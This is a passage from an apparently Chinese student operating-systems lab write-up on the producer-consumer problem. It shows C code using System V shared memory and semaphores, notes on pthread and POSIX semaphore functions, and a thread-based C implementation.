MAX_BUFFER_SIZE; k++)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;  &quot;</span>);<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|&quot;</span>);<br><span class="hljs-comment">//打印进程编号和消费数据</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;   消费者进程%d  |      消费%c       |\n&quot;</span>, i, c);<br><span class="hljs-comment">//刷新缓冲区</span><br>fflush(<span class="hljs-built_in">stdout</span>);<br>Signal(mutex);<br>Signal(empty);<br>&#125;<br><span class="hljs-comment">//取消对共享内存段的连接</span><br>shmdt(addr);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br>&#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;| 进程执行时间 |      缓冲区数据       | 当前执行的进程 | 产生或消费的数据 |\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;----------------------------------------------------------------------------\n&quot;</span>);<br>gettimeofday(&amp;start, <span class="hljs-literal">NULL</span>); <span class="hljs-comment">//获取开始运行的时间（1970年1月1日到现在的秒和微秒）</span><br>shm_id = shmget(SHMKEY, MAX_BUFFER_SIZE, IPC_CREAT | SHM_MODE); <span class="hljs-comment">//创建共享内存</span><br><span class="hljs-keyword">if</span> (shm_id &lt; <span class="hljs-number">0</span>)<br>&#123;<br>perror(<span class="hljs-string">&quot;共享内存创建失败\n&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">buf</span> *<span class="hljs-title">bf</span>;</span> <span class="hljs-comment">//定义一个循环队列指针</span><br><span class="hljs-comment">//将共享内存段连接到一个进程的地址空间中</span><br><span class="hljs-type">void</span> *addr;<br>addr = shmat(shm_id, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>bf = (<span class="hljs-keyword">struct</span> buf *) addr;<br><span class="hljs-keyword">if</span> (bf == (<span class="hljs-type">void</span> *) <span class="hljs-number">-1</span>)<br>&#123;<br>perror(<span class="hljs-string">&quot;连接共享内存失败!\n&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-comment">//创建3个信号量</span><br><span class="hljs-keyword">if</span> ((full = semget(SEM_FULL, <span class="hljs-number">1</span>, IPC_CREAT | SEM_MODE)) &lt; <span class="hljs-number">0</span>)<br>&#123;<br>perror(<span class="hljs-string">&quot;创建信号量SEM_FULL失败!\n&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-keyword">if</span> ((empty = semget(SEM_EMPTY, <span class="hljs-number">1</span>, IPC_CREAT | SEM_MODE)) &lt; <span class="hljs-number">0</span>)<br>&#123;<br>perror(<span class="hljs-string">&quot;创建信号量SEM_EMPTY失败!\n&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-keyword">if</span> ((mutex = semget(MUTEX, <span class="hljs-number">1</span>, IPC_CREAT | SEM_MODE)) &lt; <span class="hljs-number">0</span>)<br>&#123;<br>perror(<span class="hljs-string">&quot;创建信号量MUTEX失败!\n&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-comment">//设置3个信号量</span><br><span class="hljs-keyword">if</span> (semctl(full, <span class="hljs-number">0</span>, SETVAL, <span class="hljs-number">0</span>) == <span class="hljs-number">-1</span>) <span class="hljs-comment">//SEM_FULL-&gt;0</span><br>&#123;<br>perror(<span class="hljs-string">&quot;SEM_FULL设置失败!\n&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (semctl(empty, <span class="hljs-number">0</span>, SETVAL, <span class="hljs-number">10</span>) == <span class="hljs-number">-1</span>) <span class="hljs-comment">//SEM_EMPTY-&gt;10</span><br>&#123;<br>perror(<span class="hljs-string">&quot;SEM_EMPTY设置失败!\n&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (semctl(mutex, <span class="hljs-number">0</span>, SETVAL, <span class="hljs-number">1</span>) == <span class="hljs-number">-1</span>) <span class="hljs-comment">//MUTEX-&gt;1</span><br>&#123;<br>perror(<span class="hljs-string">&quot;MUTEX设置失败!\n&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-comment">//初始化缓冲区</span><br><span class="hljs-built_in">memset</span>(bf-&gt;str,<span class="hljs-string">&#x27;\0&#x27;</span>,<span class="hljs-keyword">sizeof</span>(bf-&gt;str));<br>bf-&gt;out = <span class="hljs-number">0</span>;<br>bf-&gt;in = <span class="hljs-number">0</span>;<br>bf-&gt;is_empty = <span class="hljs-number">1</span>;<br>bf-&gt;num = <span class="hljs-number">0</span>;<br>Producer(bf);<br>Consumer(bf);<br><span class="hljs-comment">//等待程序结束</span><br><span class="hljs-keyword">while</span> (wait(<span class="hljs-number">0</span>) != <span class="hljs-number">-1</span>);<br><span class="hljs-comment">//取消对共享内存的连接</span><br>shmdt(addr);<br><span class="hljs-comment">//删除共享内存段</span><br>shmctl(shm_id, IPC_RMID, <span class="hljs-number">0</span>);<br><span class="hljs-comment">//撤销信号量</span><br>shmctl(full, IPC_RMID, <span class="hljs-number">0</span>);<br>shmctl(empty, IPC_RMID, <span class="hljs-number">0</span>);<br>shmctl(mutex, IPC_RMID, <span class="hljs-number">0</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;----------------------------------------------------------------------------\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;程序结束!\n&quot;</span>);<br>fflush(<span class="hljs-built_in">stdout</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h2><p><img src="/2021/11/29/%E5%AE%9E%E9%AA%8C%E5%85%AD_%E7%94%9F%E4%BA%A7%E8%80%85%E6%B6%88%E8%B4%B9%E8%80%85%E9%97%AE%E9%A2%98%E7%9A%84%E5%AE%9E%E7%8E%B0/image-20211130180127855.png" alt="image-20211130180127855"></p><h2 id="思考题"><a href="#思考题" class="headerlink" title="思考题"></a>思考题</h2><p>以上是通过进程来实现生产者和消费者问题，考虑如何采用线程来实现。</p><ul><li>相比于进程实现，线程实现有以下几个不同：<ul><li>进程实现主要使用fork()来实现创建进程，而线程实现主要使用库<pthread.h>来实现线程。</pthread.h></li><li>线程间通信无需共享内存，故无需库<sys shm.h>，循环数组buf也不需要定义成指针指向地址空间。</sys></li><li>进程的信号量通过库<sys sem.h>实现，而线程的信号量是通过库<semaphore.h>实现的。</semaphore.h></sys></li></ul></li></ul><h3 id="主要的库函数"><a href="#主要的库函数" class="headerlink" title="主要的库函数"></a>主要的库函数</h3><ul><li><p><pthread.h>中：</pthread.h></p><ul><li><p><code>pthread_t</code>：声明线程标识符。</p></li><li><p><code>pthread_create()</code>函数：用于创建线程。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_create</span><span class="hljs-params">(<span class="hljs-type">pthread_t</span> *tidp,<span class="hljs-type">const</span> <span class="hljs-type">pthread_attr_t</span> *attr,<span class="hljs-type">void</span> *(*start_rtn)(<span class="hljs-type">void</span>*),<span class="hljs-type">void</span> *arg)</span>;<br></code></pre></div></td></tr></table></figure><ul><li>第一个参数是指向线程标识符的指针。</li><li>第二个参数指定各种不同的线程属性，可以为NULL。</li><li>第三个参数是<strong>线程运行函数</strong>的起始地址。</li><li>第四个参数是运行函数的参数。</li></ul></li><li><p><code>pthread_join</code>用来等待一个线程的结束,线程间同步的操作 </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_join</span><span class="hljs-params">(<span class="hljs-type">pthread_t</span> thread, <span class="hljs-type">void</span> **retval)</span>;<br></code></pre></div></td></tr></table></figure><ul><li>第一个参数为线程标识符，即线程ID。</li><li>第二个参数retval为用户定义的指针，用来存储线程的返回值。</li></ul></li></ul></li><li><p><semaphore.h>中：</semaphore.h></p><ul><li><p><code>sem_t</code>：信号量的数据类型。</p></li><li><p><code>sem_init()</code>函数：信号量初始化</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">sem_init(<span class="hljs-type">sem_t</span> *sem, <span class="hljs-type">int</span> pshared, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> value);<br></code></pre></div></td></tr></table></figure><ul><li>第一个参数*sem是对应的信号量。</li><li>第二个参数pshared：0表⽰线程间共享，非0表示进程间共享。</li><li>第三个参数value是信号量初值，大于0表示才可以访问。</li></ul></li><li><p><code>sem_wait()</code>函数：P操作。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">sem_wait</span><span class="hljs-params">(<span class="hljs-type">sem_t</span> *sem)</span>;<br></code></pre></div></td></tr></table></figure></li><li><p><code>sem_post()</code>函数：V操作</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">sem_post</span><span class="hljs-params">(<span class="hljs-type">sem_t</span> *sem)</span>;<br></code></pre></div></td></tr></table></figure></li></ul></li></ul><h3 id="源程序并附上注释-1"><a href="#源程序并附上注释-1" class="headerlink" title="源程序并附上注释"></a>源程序并附上注释</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-comment">//缓冲区大小</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_BUFFER_SIZE 10</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">buf</span> //循环队列</span><br><span class="hljs-class">&#123;</span><br><span class="hljs-type">int</span> in; <span class="hljs-comment">//指向缓冲中下一个空位</span><br><span class="hljs-type">int</span> out; <span class="hljs-comment">//指向缓冲中第一个满位</span><br><span class="hljs-type">char</span> str[MAX_BUFFER_SIZE]; <span class="hljs-comment">//存放字母</span><br><span class="hljs-type">int</span> num; <span class="hljs-comment">//产品个数</span><br><span class="hljs-type">int</span> is_empty; <span class="hljs-comment">//是否为空</span><br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">buf</span> <span class="hljs-title">bf</span>;</span> <span class="hljs-comment">//定义一个循环队列</span><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N_Consumer = <span class="hljs-number">2</span>; <span class="hljs-comment">//消费者数量</span><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N_Producer = <span class="hljs-number">2</span>; <span class="hljs-comment">//生产者数量</span><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N_Buffer = <span class="hljs-number">10</span>; <span class="hljs-comment">//缓冲区大小</span><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N_Worktime = <span class="hljs-number">10</span>; <span class="hljs-comment">//每个进程执行的次数</span><br><span class="hljs-type">sem_t</span> full, empty, mutex; <span class="hljs-comment">//三个信号量</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">timeval</span> <span class="hljs-title">start</span>;</span> <span class="hljs-comment">//开始时间</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">timeval</span> <span class="hljs-title">now</span>;</span> <span class="hljs-comment">//当前时间</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">get_rand_num</span><span class="hljs-params">()</span> <span class="hljs-comment">//0~99 随机数</span><br>&#123;<br>gettimeofday(&amp;now, <span class="hljs-literal">NULL</span>);<br><span class="hljs-type">int</span> digit;<br>srand((<span class="hljs-type">unsigned</span>)(now.tv_usec)); <span class="hljs-comment">//当前时间（微秒）作为随机数种子</span><br>digit = rand() % <span class="hljs-number">100</span>;<br><span class="hljs-keyword">return</span> digit;<br>&#125;<br><br><span class="hljs-type">char</span> <span class="hljs-title function_">get_rand_letter</span><span class="hljs-params">()</span> <span class="hljs-comment">//随机生成A~Z</span><br>&#123;<br>gettimeofday(&amp;now, <span class="hljs-literal">NULL</span>);<br><span class="hljs-type">char</span> letter;<br>srand((<span class="hljs-type">unsigned</span>)(now.tv_usec));<br>letter = (<span class="hljs-type">char</span>)((rand() % <span class="hljs-number">26</span>) + <span class="hljs-string">&#x27;A&#x27;</span>);<br><span class="hljs-keyword">return</span> letter;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Wait</span><span class="hljs-params">(<span class="hljs-type">sem_t</span> &amp;sem)</span> <span class="hljs-comment">//P操作</span><br>&#123;<br>sem_wait(&amp;sem);<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Signal</span><span class="hljs-params">(<span class="hljs-type">sem_t</span> &amp;sem)</span> <span class="hljs-comment">//V操作</span><br>&#123;<br>sem_post(&amp;sem);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">printTime</span><span class="hljs-params">()</span> <span class="hljs-comment">//输出时间</span><br>&#123;<br>gettimeofday(&amp;now, <span class="hljs-literal">NULL</span>);<br><span class="hljs-type">double</span> difference = ((<span class="hljs-type">double</span>)now.tv_usec - (<span class="hljs-type">double</span>)start.tv_usec) / <span class="hljs-number">1000000</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;| %8.4fs    | &quot;</span>, difference);<br>&#125;<br><br><span class="hljs-comment">//生产者操作</span><br><span class="hljs-type">void</span> *<span class="hljs-title function_">Producer</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span><br>&#123;<br><span class="hljs-type">int</span> i,j;<br><span class="hljs-type">int</span> count = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; N_Worktime; j++) <span class="hljs-comment">//每个线程操作10次</span><br>&#123;<br>Wait(empty);<br>Wait(mutex);<br><span class="hljs-comment">//随机等待一段时间(0~99微秒)</span><br>usleep(get_rand_num());<br><span class="hljs-comment">//向缓冲区添加数据</span><br><span class="hljs-type">char</span> c = get_rand_letter();<br>bf.str[bf.in] = c;<br>bf.in = (bf.in + <span class="hljs-number">1</span>) % MAX_BUFFER_SIZE;<br>bf.is_empty = <span class="hljs-number">0</span>;<br>bf.num++;<br><span class="hljs-type">int</span> first, last;<br><span class="hljs-comment">//打印时间</span><br>printTime();<br><span class="hljs-comment">//打印缓冲区数据</span><br><span class="hljs-keyword">if</span> (bf.in - <span class="hljs-number">1</span> &gt;= bf.out)<br>last = bf.in - <span class="hljs-number">1</span>;<br><span class="hljs-keyword">else</span><br>last = bf.in - <span class="hljs-number">1</span> + MAX_BUFFER_SIZE;<br><span class="hljs-keyword">for</span> (first = bf.out; bf.num&gt;<span class="hljs-number">0</span>&amp;&amp;first &lt;= last; first++)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c &quot;</span>, bf.str[first % MAX_BUFFER_SIZE]);<br>&#125;<br><span class="hljs-type">int</span> k;<br><span class="hljs-keyword">for</span> (k = bf.num; k &lt;= MAX_BUFFER_SIZE; k++)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;  &quot;</span>);<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|&quot;</span>);<br><span class="hljs-comment">//打印进程编号和产生数据</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;   生产者线程%d  |      生产%c       |\n&quot;</span>,*(<span class="hljs-type">int</span>*)arg, c);<br>Signal(mutex);<br>Signal(full);<br>&#125;<br><span class="hljs-keyword">return</span> (<span class="hljs-type">void</span>*)<span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">//消费者操作</span><br><span class="hljs-type">void</span> *<span class="hljs-title function_">Consumer</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span><br>&#123;<br><span class="hljs-type">int</span> i, j;<br><span class="hljs-type">int</span> count = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; N_Worktime; j++) <span class="hljs-comment">//每个线程操作10次</span><br>&#123;<br>Wait(full);<br>Wait(mutex);<br><span class="hljs-comment">//随机等待一段时间(0~99微秒)</span><br>usleep(get_rand_num());<br><span class="hljs-comment">//从缓冲区取走数据</span><br><span class="hljs-type">char</span> c = bf.str[bf.out];<br>bf.out = (bf.out + <span class="hljs-number">1</span>) % MAX_BUFFER_SIZE;<br>bf.is_empty = (bf.out == bf.in);<br>bf.num--;<br><span class="hljs-type">int</span> first, last;<br><span class="hljs-comment">//打印时间</span><br>printTime();<br><span class="hljs-comment">//打印缓冲区数据</span><br><span class="hljs-keyword">if</span> (bf.in - <span class="hljs-number">1</span> &gt;= bf.out)<br>last = bf.in - <span class="hljs-number">1</span>;<br><span class="hljs-keyword">else</span><br>last = bf.in - <span class="hljs-number">1</span> + MAX_BUFFER_SIZE;<br><span class="hljs-keyword">for</span> (first = bf.out; bf.num&gt;<span class="hljs-number">0</span>&amp;&amp;first &lt;= last; first++)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c &quot;</span>, bf.str[first % MAX_BUFFER_SIZE]);<br>&#125;<br><span class="hljs-type">int</span> k;<br><span class="hljs-keyword">for</span> (k = bf.num; k &lt;= MAX_BUFFER_SIZE; k++)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;  &quot;</span>);<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|&quot;</span>);<br><span class="hljs-comment">//打印进程编号和消费数据</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;   消费者线程%d  |      消费%c       |\n&quot;</span>, *(<span class="hljs-type">int</span>*)arg, c);<br>Signal(mutex);<br>Signal(empty);<br>&#125;<br><span class="hljs-keyword">return</span> (<span class="hljs-type">void</span>*)<span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;| 线程执行时间 |      缓冲区数据       | 当前执行的线程 | 产生或消费的数据 |\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;----------------------------------------------------------------------------\n&quot;</span>);<br>gettimeofday(&amp;start, <span class="hljs-literal">NULL</span>); <span class="hljs-comment">//获取开始运行的时间（1970年1月1日到现在的秒和微秒）</span><br><br><span class="hljs-comment">//创建并初始化3个信号量</span><br><span class="hljs-keyword">if</span> (sem_init(&amp;full, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>)<br>&#123;<br>perror(<span class="hljs-string">&quot;创建信号量SEM_FULL失败!\n&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (sem_init(&amp;empty, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>) &lt; <span class="hljs-number">0</span>)<br>&#123;<br>perror(<span class="hljs-string">&quot;创建信号量SEM_EMPTY失败!\n&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (sem_init(&amp;mutex, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>)<br>&#123;<br>perror(<span class="hljs-string">&quot;创建信号量MUTEX失败!\n&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-comment">//初始化缓冲区</span><br><br><span class="hljs-built_in">memset</span>(bf.str, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-keyword">sizeof</span>(bf.str));<br>bf.out = <span class="hljs-number">0</span>;<br>bf.in = <span class="hljs-number">0</span>;<br>bf.is_empty = <span class="hljs-number">1</span>;<br>bf.num = <span class="hljs-number">0</span>;<br><br><span class="hljs-comment">//定义4个线程</span><br><span class="hljs-type">pthread_t</span> producer0;<br><span class="hljs-type">pthread_t</span> producer1;<br><span class="hljs-type">pthread_t</span> consumer0;<br><span class="hljs-type">pthread_t</span> consumer1;<br><br><span class="hljs-type">int</span> arg0 = <span class="hljs-number">0</span>, arg1 = <span class="hljs-number">1</span>; <span class="hljs-comment">//传入函数的参数（代表进程编号）</span><br><br><span class="hljs-comment">//创建线程</span><br><span class="hljs-keyword">if</span> (pthread_create(&amp;producer0, <span class="hljs-literal">NULL</span>, Producer, &amp;arg0) != <span class="hljs-number">0</span>)<br>&#123;<br>perror(<span class="hljs-string">&quot;创建生产者线程失败！\n&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (pthread_create(&amp;producer1, <span class="hljs-literal">NULL</span>, Producer, &amp;arg1) != <span class="hljs-number">0</span>)<br>&#123;<br>perror(<span class="hljs-string">&quot;创建生产者线程失败！\n&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (pthread_create(&amp;consumer0, <span class="hljs-literal">NULL</span>, Consumer, &amp;arg0) != <span class="hljs-number">0</span>)<br>&#123;<br>perror(<span class="hljs-string">&quot;创建消费者线程失败！\n&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (pthread_create(&amp;consumer1, <span class="hljs-literal">NULL</span>, Consumer, &amp;arg1) != <span class="hljs-number">0</span>)<br>&#123;<br>perror(<span class="hljs-string">&quot;创建消费者线程失败！\n&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-comment">//ret:接收函数pthread_join中被等待线程的返回值</span><br><span class="hljs-type">int</span>  ret1,ret2,ret3,ret4;<br>pthread_join(producer0, (<span class="hljs-type">void</span> **)&amp;ret1);<br>pthread_join(producer1, (<span class="hljs-type">void</span> **)&amp;ret2);<br>pthread_join(consumer0, (<span class="hljs-type">void</span> **)&amp;ret3);<br>pthread_join(consumer1, (<span class="hljs-type">void</span> **)&amp;ret4);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;----------------------------------------------------------------------------\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;程序结束!\n&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="运行结果-1"><a href="#运行结果-1" class="headerlink" title="运行结果"></a>运行结果</h3><p><img 